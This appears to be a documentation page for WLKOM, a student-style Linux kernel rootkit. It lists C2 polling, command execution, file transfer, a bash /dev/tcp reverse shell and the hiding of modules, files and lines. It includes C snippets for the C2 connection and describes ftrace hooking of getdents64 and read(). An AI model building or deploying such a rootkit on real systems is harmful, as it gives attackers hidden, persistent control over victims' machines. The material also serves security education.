---
title: Rootkit (LKM)
description: Overview of the WLKOM Linux Kernel Module — features, lifecycle, and key concepts.
---

A Linux Kernel Module loaded on the victim, polling, executing, transferring, hiding.

## Module info

| Property | Value |
|----------|-------|
| Module name | `wlkom.ko` |
| Language | C (kernel space) |
| Kernel target | Linux ≥ 5.0 (tested 6.6 LTS) |
| Poll interval | 5 seconds |
| File transfer limit | 64 KiB (`FILE_BUF_SIZE`) |
| UUID storage | `/rootkit/uuid` |

## Features

| Feature | Category | Description |
|---------|----------|-------------|
| [Connection & Polling](/rootkit/connection) | Mandatory | Register with C2 on load, poll for actions every 5 s |
| [Execute Commands](/rootkit/exec) | Mandatory | Run shell commands, capture stdout/stderr/exit code |
| [Upload / Download](/rootkit/upload-download) | Optional | Bidirectional file transfer over HTTP |
| [Reverse Shell](/rootkit/reverse-shell) | Bonus | Interactive bash session back to attacker |
| [Hide Module](/rootkit/hide-module) | Optional | Remove from `lsmod`, `/proc/modules`, `/sys/module/` |
| [Hide Files](/rootkit/hide-files) | Optional | Hook `getdents64` to hide the rootkit directory |
| [Hide Lines](/rootkit/hide-lines) | Optional | Hook `read()` to filter lines from file content |

## What is a rootkit?

A **rootkit** is a piece of software designed to gain persistent, hidden access to a machine, typically with the goal of keeping that access secret from the system owner and security tools. The term comes from the Unix world: *root* (the administrator account) + *kit* (a set of tools).

WLKOM is a **kernel-level rootkit**, meaning it runs inside the Linux kernel itself rather than in userland. This gives it complete control over the system: it can intercept any system call, manipulate kernel data structures, and remain invisible to any process running in user space.

## Linux Kernel Modules (LKM)

A **Linux Kernel Module** is a piece of object code that can be loaded into a running kernel without rebooting. It runs in **ring 0**, the most privileged CPU execution level, and has direct access to all kernel APIs, memory, and hardware.

Two entry points define the lifecycle of any LKM:

```c
static int __init wlkom_init(void) {
    hide_module();   // remove from lsmod / /proc/modules
    c2_init();       // connect to C2, start polling thread
    return 0;
}

static void __exit wlkom_exit(void) {
    c2_cleanup();    // stop polling, free resources
}

module_init(wlkom_init);
module_exit(wlkom_exit);
```

The module is loaded with `insmod wlkom.ko c2_host=<IP>` and immediately hides itself, making it invisible in `lsmod` or `/proc/modules`. It then spawns a kernel thread that periodically contacts the C2 server.

## HTTP in kernel space

One of the biggest challenges of this project is implementing an **HTTP client from scratch in the Linux kernel**. There is no standard library, no libc, no `curl`. Instead, the kernel's own **socket API** (`sock_create`, `kernel_connect`, `kernel_sendmsg`, `kernel_recvmsg`) is used to open a raw TCP connection and hand-write HTTP/1.0 requests as byte strings.

**Why HTTP/1.0 and not 1.1?**
- HTTP/1.0 closes the connection after each request — no need to manage persistent connections or chunked transfer encoding
- No `Transfer-Encoding: chunked` to parse
- Each response ends when the server closes the socket — simple to detect

```c
// Build raw HTTP/1.0 request
snprintf(buf, sizeof(buf),
    "GET %s HTTP/1.0\r\n"
    "Host: %s\r\n"
    "Connection: close\r\n"
    "\r\n", path, c2_host);

// Send over kernel TCP socket
kvec.iov_base = buf;
kvec.iov_len  = strlen(buf);
kernel_sendmsg(sock, &msg, &kvec, 1, kvec.iov_len);
```

## Syscall hooking via ftrace

WLKOM hooks two syscalls using **ftrace**, the kernel's native function tracing framework. The classic alternative — clearing the WP bit in CR0 and patching the syscall table directly — was tried first but **panicked the kernel** on Arch Linux 6.6 due to `CONFIG_STRICT_KERNEL_RWX`, which enforces page permissions at the MMU level independently of CR0.

ftrace works by redirecting the `call __fentry__` instruction that the compiler inserts at the start of every kernel function. The hook installs a `ftrace_ops` callback that rewrites `regs->ip` to point at the replacement function — without touching any read-only pages.

Two calls are hooked:

**`getdents64`** — called by `ls`, `find`, and any directory listing. The hook checks whether the fd points to a directory in `hidden_dirs[]` (by inode) and returns 0 if so. For other directories, it calls the original and filters out entries whose names start with a prefix in `hide_prefixes[]`.

**`read()`** — called whenever a process reads a file. The hook skips non-regular files (PTYs, sockets, pipes) via an `S_ISREG` check, then scans the buffer for lines matching `hide_lines[]` and splices them out before returning to the caller.

## Source tree

```
rootkit/src/
├─ wlkom_main.c   Module init/exit, calls hide_module() then c2_init()
├─ c2.c           HTTP client, UUID registration, action polling, result posting, file transfer
├─ exec.c         Command execution via call_usermodehelper(), reverse shell via bash /dev/tcp
├─ hide.c         All hiding: hide_module(), hook_getdents64, hook_read via ftrace
└─ utils.c        Kernel file I/O helpers: read_file() and write_file() via VFS
```
